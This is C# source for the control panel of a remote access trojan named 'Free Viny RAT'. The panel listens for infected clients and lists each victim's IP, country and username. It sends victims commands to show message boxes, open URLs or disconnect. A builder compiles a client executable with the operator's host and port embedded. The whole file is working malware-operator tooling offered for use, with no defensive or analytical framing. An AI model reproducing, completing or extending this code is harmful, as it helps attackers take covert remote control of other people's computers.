using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using Microsoft.VisualBasic;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.CodeDom.Compiler;
using System.Collections.Specialized;
using System.Diagnostics;

namespace Free_Viny_RAT
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        Listener server;
        Thread startListen;
        private string contents;
        private object compars;

        public Form1()
        {
            InitializeComponent();
            server = new Listener();
        }

        void updateOnline(int count)
        {
            /* My method of updating the online count */
            tslblOnline.Text = "Online: " + count.ToString();
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            startListen = new Thread(listen); /* Starts a new listening thread. */
            startListen.Start();
        }

        void listen()
        {
            /* Our thread-method for listening. */
            server.BeginListen(int.Parse(Interaction.InputBox("Enter port:", "Select a port", "1997"))); /* Sets a port and begins listening*/
            server.Received += new Listener.ReceivedEventHandler(server_Received);
            server.Disconnected += new Listener.DisconnectedEventHandler(server_Disconnected);
        }

        void server_Disconnected(Listener l, Info i)
        {
            /* Disconnection event */
            Invoke(new _Remove(Remove), i);
        }

        void server_Received(Listener l, Info i, string received)
        {
            /* Received event */
            string[] cmd = received.Split('|'); /* This splits our received data. */
            switch (cmd[0]) /* A simple switch-statement to check each command. If-statements could be used, but it'd be longer.*/
            {
                case "CONNECTION":
                    Invoke(new _Add(Add), i, cmd[1], cmd[2]);
                    break;
                case "STATUS":
                    Invoke(new _Status(Status), i, cmd[1]);
                    break;
            }
        }

        private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        /* From here on, we will be invoking. Now the reason why we do this is because I don't want to be using CheckForIllegalCrossThreads = false. That's a bad habit! */
        /* I also wanted to thank xSilent for teaching me how to do this. */
        delegate void _Add(Info i, string country, string username);
        void Add(Info i, string country, string username)
        {
            /* This is our method for adding clients */
            string[] splitIP = i.RemoteAddress.Split(':');
            ListViewItem item = new ListViewItem();
            item.Text = splitIP[0]; /* First column: IP Address */
            item.SubItems.Add(country); /* Second column: Country */
            item.SubItems.Add(username); /* Third column: Username */
            item.SubItems.Add("Connected!"); /* Fourth column(just so we don't have a null value): Status */
            item.Tag = i;
            lvConnections.Items.Add(item);

            updateOnline(lvConnections.Items.Count);
        }

        delegate void _Remove(Info i);
        void Remove(Info i)
        {
            /* Self explanatory. Just removes the client in the listview */
            foreach (ListViewItem item in lvConnections.Items)
            {
                if ((Info)item.Tag == i)
                {
                    item.Remove();
                    updateOnline(lvConnections.Items.Count);
                    break;
                }
            }
        }

        delegate void _Status(Info i, string status);
        void Status(Info i, string status)
        {
            /* Another self explanatory method. Changes the status*/
            foreach (ListViewItem item in lvConnections.Items)
            {
                if ((Info)item.Tag == i)
                {
                    item.SubItems[3].Text = status;
                    break;
                }
            }
        }

        private void sendMessageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            /* Command: Send Messagebox */
            string msg = Interaction.InputBox("Enter message:", "Send Messagebox", "Sleeker IS best");
            foreach (ListViewItem item in lvConnections.SelectedItems)
            {
                Info client = (Info)item.Tag;
                client.Send("MSGBOX|" + msg);
            }
        }

        private void openURLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            /* Command: Open URL */
            string url = Interaction.InputBox("Enter URL:", "Open URL", "http://www.google.com");
            foreach (ListViewItem item in lvConnections.SelectedItems)
            {
                Info client = (Info)item.Tag;
                client.Send("OPENURL|" + url);
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            /* Command: Disconnect */
            foreach (ListViewItem item in lvConnections.SelectedItems)
            {
                Info client = (Info)item.Tag;
                client.Send("DISCONNECT|");
            }
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            /* This is the build feature. I'd like to give credits to xSilent for using his CodeDom class! */
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Executables | *.exe";
            logs.Items.Add("Adding Code....");
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                string Source = Properties.Resources.Source; /* The main source */
                string ClientSettings = Properties.Resources.ClientSettings; /* ClientSettings wrapper */
                /* Replacing variables */
                Source = Source.Replace("[IP]", txtHost.Text);
                logs.Items.Add("Adding Host....");
                Source = Source.Replace("[PORT]", txtPort.Text);
                logs.Items.Add("Adding Port....");
                CodeDom.Compile(sfd.FileName, Source, ClientSettings);
                MessageBox.Show("Compiled successfully at: " + sfd.FileName);
                logs.Items.Add("Code Compiled!");
            }
        }


        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void sendMsgToolStripMenuItem_Click(object sender, EventArgs e)
        {
            /* Command: Send Messagebox */
            string msg = Interaction.InputBox("Enter message:", "Send Messagebox", "VINY IS best");
            foreach (ListViewItem item in lvConnections.SelectedItems)
            {
                Info client = (Info)item.Tag;
                client.Send("MSGBOX|" + msg);
            }
        }

        private void disconnectToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            /* Command: Disconnect */
            foreach (ListViewItem item in lvConnections.SelectedItems)
            {
                Info client = (Info)item.Tag;
                client.Send("DISCONNECT|");
            }
        }

        private void openURLToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            /* Command: Open URL */
            string url = Interaction.InputBox("Enter URL:", "Open URL", "http://www.google.com");
            foreach (ListViewItem item in lvConnections.SelectedItems)
            {
                Info client = (Info)item.Tag;
                client.Send("OPENURL|" + url);
            }
        }
    }
}
